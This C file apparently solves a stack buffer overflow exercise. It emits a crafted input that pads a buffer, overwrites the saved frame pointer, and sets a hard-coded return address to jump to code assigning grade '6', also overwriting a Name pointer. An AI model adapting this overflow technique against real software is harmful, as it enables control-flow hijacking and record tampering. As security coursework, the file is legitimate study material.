#include <stdio.h>
int main(){
    int i;
    fputs("Lymperis",stdout);
    for(i=0;i<29;i++){
        putchar('\0');          /*buf c i */
    }   

    for(i=0;i<8;i++){
        putchar(' ');       /*more bytes*/
    }

    for(i=0;i<4;i++){
        putchar('a');      /*ebp*/
    }

    putchar(0x8e);
    putchar(0x9e);
    putchar(0x04);  /*return address and goto grade = '6'*/
    putchar(0x80);

    /*The Name var */

    putchar(0xdc);
    putchar(0x42);
    putchar(0x0e);  /*bytes of Name*/
    putchar(0x80);

return 0;
    
}